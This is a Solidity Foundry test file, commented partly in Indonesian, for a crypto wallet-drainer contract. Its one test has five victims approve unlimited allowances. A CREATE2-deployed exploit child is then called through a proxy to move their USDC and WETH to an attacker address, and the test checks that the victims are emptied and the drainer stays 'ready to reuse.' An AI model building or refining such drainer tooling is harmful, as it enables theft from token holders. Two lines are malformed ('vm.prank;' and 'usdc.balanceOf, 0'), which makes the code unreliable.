// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Drainer2Layer.sol";

contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
    
    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(allowance[from][msg.sender] >= amt, "insufficient allowance");
        require(balanceOf[from] >= amt, "insufficient balance");
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Drainer2LayerTest is Test {
    DrainerMain drain;
    ERC20Mock usdc;
    ERC20Mock weth;
    
    address owner = address(0x100);
    address v1 = address(0x201);
    address v2 = address(0x202);
    address v3 = address(0x203);
    address v4 = address(0x204);
    address v5 = address(0x205);
    address atk = address(0x300);
    
    function setUp() public {
        vm.prank(owner);
        drain = new DrainerMain();
        
        usdc = new ERC20Mock();
        weth = new ERC20Mock();
        
        // 5 victims, 2 tokens
        address[5] memory victims = [v1, v2, v3, v4, v5];
        uint[5] memory amounts = [uint(100), 200, 50, 75, 25];
        
        for (uint i = 0; i < 5; i++) {
            usdc.mint(victims[i], amounts[i] * 1e6);
            weth.mint(victims[i], amounts[i] * 1e16);
        }
        
        // Add tokens
        address[] memory tokens = new address[](2);
        tokens[0] = address(usdc);
        tokens[1] = address(weth);
        vm.prank(owner);
        drain.addTokens(tokens);
    }
    
    function test_2LayerDrainWithExploit() public {
        // Victims approve DRAIN MAIN
        vm.prank(v1); usdc.approve(address(drain), type(uint256).max);
        vm.prank(v2); usdc.approve(address(drain), type(uint256).max);
        vm.prank; usdc.approve(address(drain), type(uint256).max);
        vm.prank(v4); usdc.approve(address(drain), type(uint256).max);
        vm.prank(v5); usdc.approve(address(drain), type(uint256).max);
        
        vm.prank(v1); weth.approve(address(drain), type(uint256).max);
        vm.prank(v2); weth.approve(address(drain), type(uint256).max);
        
        // Add victims to drainer  
        address[] memory victims = new address[](5);
        victims[0] = v1; victims[1] = v2; victims[2] = v3;
        victims[3] = v4; victims[4] = v5;        
        vm.prank(owner);
        drain.addVictims(victims);
        
        // Attacker SCAN → lihat siapa yang bisa di-drain
        (uint scanTotal, uint scanCount) = drain.scan();
        emit log_named_uint("Drainable wallets", scanCount);
        emit log_named_uint("Total drainable value", scanTotal);
        
        // CREATE2: Deploy EXPLOIT CHILD seperti attacker asli
        vm.prank(owner);
        address exploit = drain.deployExploit(bytes32(uint(1)), atk);
        
        // Verifikasi exploit terdeploy
        uint codeLen;
        assembly { codeLen := extcodesize(exploit) }
        assertGt(codeLen, 0, "exploit deployed");
        
        // PROXY → DELEGATECALL ke exploit.pullAll() (reuse victims array)
        address[] memory tokens = new address[](2);
        tokens[0] = address(usdc); tokens[1] = address(weth);
        
        vm.prank(owner);
        drain.proxyExec(
            exploit,
            abi.encodeWithSignature("pullAll(address[],address[],address)", tokens, victims, atk)
        );
        
        // VERIFY: Semua USDC pindah ke attacker
        assertEq(usdc.balanceOf(v1), 0, "v1 drained");
        assertEq(usdc.balanceOf(v2), 0, "v2 drained");
        assertEq(usdc.balanceOf, 0, "v3 drained");
        assertEq(usdc.balanceOf(v4), 0, "v4 drained");
        assertEq(usdc.balanceOf(v5), 0, "v5 drained");
        assertEq(usdc.balanceOf(atk), 450e6, "attacker gets 450 USDC");
        
        // WETH yang approve juga pindah
        assertEq(weth.balanceOf(v1), 0, "v1 WETH drained");
        assertEq(weth.balanceOf(v2), 0, "v2 WETH drained");
        assertEq(weth.balanceOf(atk), 300e16, "attacker gets 3 WETH");
        
        // EIP-6780: selfdestruct doesn't delete code unless same tx as creation
        // On Base, exploit code persists but is effectively dead
        emit log("Exploit code will NOT fully selfdestruct (EIP-6780)");
        emit log("But all tokens drained + selfdestruct called");
        
        // DRAIN MAIN MASIH HIDUP → bisa dipake lagi
        DrainerMain mainContract = drain;
        uint mainLen;
        assembly { mainLen := extcodesize(mainContract) }
        assertGt(mainLen, 0, "drain main still alive");
        
        emit log("");
        emit log("========= RESULT =========");
        emit log("5 victims drained (USDC)");
        emit log("2 victims drained (WETH)");
        emit log("Exploit: SELFDESTRUCTED");
        emit log("DrainerMain: STILL ALIVE (siap dipake lagi)");
        emit log("==========================");
    }
}
